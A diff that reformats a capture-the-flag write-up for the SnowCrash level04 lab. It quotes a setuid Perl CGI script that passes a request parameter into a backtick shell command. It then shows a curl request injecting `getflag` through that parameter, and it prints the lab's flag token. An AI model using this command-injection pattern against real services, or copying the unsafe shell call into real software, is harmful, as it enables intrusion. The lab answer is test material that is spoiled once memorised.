@@ -1,3 +1,4 @@
+```
 level04@SnowCrash:~$ ls -la
 total 16
 dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
@@ -6,11 +7,10 @@ d--x--x--x  1 root    users    340 Aug 30  2015 ..
 -r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
 -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
 -r-x------  1 level04 level04  675 Apr  3  2012 .profile
-
-
-Perl Script file
-
-cat level04.pl
+```
+We have a Perl Script file. Let's look inside:
+```
+level04@SnowCrash:~$ cat level04.pl
 #!/usr/bin/perl
 # localhost:4747
 use CGI qw{param};
@@ -20,8 +20,9 @@ sub x {
   print `echo $y 2>&1`;
 }
 x(param("x"));
-
-
-
+```
+This script will execute and print the output of variable `x`. Let's send the request for flag: 
+```
 level04@SnowCrash:~$ curl 'localhost:4747/level04.pl?x=`getflag`'
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+```
